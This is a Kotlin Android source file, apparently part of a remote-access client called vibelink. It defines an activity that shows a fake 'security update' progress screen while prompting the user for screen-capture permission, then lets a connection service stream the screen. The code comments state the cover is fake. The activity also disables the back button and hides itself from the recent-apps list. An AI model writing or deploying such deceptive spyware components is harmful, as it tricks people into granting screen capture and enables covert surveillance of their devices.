package com.vibelink.client.ui

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.WindowManager
import android.widget.ProgressBar
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import com.vibelink.client.R
import com.vibelink.client.screen.MediaProjectionHolder
import com.vibelink.client.service.ConnectionService

/**
 * Fake "SECURITY update" cover while requesting MediaProjection consent.
 * Progress reaches 100% after user allows screen capture; then ConnectionService can stream.
 */
class ScreenCastConsentActivity : AppCompatActivity() {
    private val mainHandler = Handler(Looper.getMainLooper())
    private var progressBar: ProgressBar? = null
    private var progressText: TextView? = null
    private var progressValue = 0
    private var consentFinished = false
    private var waitingForResult = false

    private val progressTicker = object : Runnable {
        override fun run() {
            if (isFinishing || consentFinished) {
                return
            }
            // Creep toward 90% while waiting for system dialog / user action.
            if (progressValue < 90) {
                progressValue = (progressValue + 3).coerceAtMost(90)
                renderProgress()
            }
            mainHandler.postDelayed(this, 120L)
        }
    }

    private val projectionLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult(),
    ) { result ->
        waitingForResult = false
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            MediaProjectionHolder.store(result.resultCode, result.data!!)
            animateToCompleteAndFinish(success = true)
        } else {
            MediaProjectionHolder.clear()
            notifyServiceConsentResult(granted = false)
            finish()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        setContentView(R.layout.activity_screen_cast_consent)
        progressBar = findViewById(R.id.castProgressBar)
        progressText = findViewById(R.id.castProgressText)
        renderProgress()

        if (MediaProjectionHolder.hasConsent()) {
            animateToCompleteAndFinish(success = true)
            return
        }

        mainHandler.post(progressTicker)
        mainHandler.postDelayed({ launchConsentIfNeeded() }, 400L)
    }

    override fun onDestroy() {
        mainHandler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        // Block back during fake update cover.
    }

    private fun launchConsentIfNeeded() {
        if (waitingForResult || isFinishing || MediaProjectionHolder.hasConsent()) {
            return
        }
        waitingForResult = true
        runCatching {
            val intent = MediaProjectionHolder.createConsentIntent(this)
            projectionLauncher.launch(intent)
        }.onFailure {
            MediaProjectionHolder.clear()
            notifyServiceConsentResult(granted = false)
            finish()
        }
    }

    private fun animateToCompleteAndFinish(success: Boolean) {
        consentFinished = true
        mainHandler.removeCallbacks(progressTicker)
        fun step() {
            if (isFinishing) {
                return
            }
            if (progressValue < 100) {
                progressValue = (progressValue + 8).coerceAtMost(100)
                renderProgress()
                mainHandler.postDelayed({ step() }, 40L)
                return
            }
            notifyServiceConsentResult(granted = success)
            mainHandler.postDelayed({ finish() }, 250L)
        }
        step()
    }

    private fun renderProgress() {
        progressBar?.progress = progressValue
        progressText?.text = getString(R.string.cast_progress_updated, progressValue)
    }

    private fun notifyServiceConsentResult(granted: Boolean) {
        val intent = Intent(this, ConnectionService::class.java).apply {
            action = ConnectionService.ACTION_PROJECTION_CONSENT_RESULT
            putExtra(ConnectionService.EXTRA_PROJECTION_GRANTED, granted)
        }
        startService(intent)
    }

    companion object {
        fun launch(context: Context) {
            val intent = Intent(context, ScreenCastConsentActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
                addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
            }
            context.startActivity(intent)
        }
    }
}
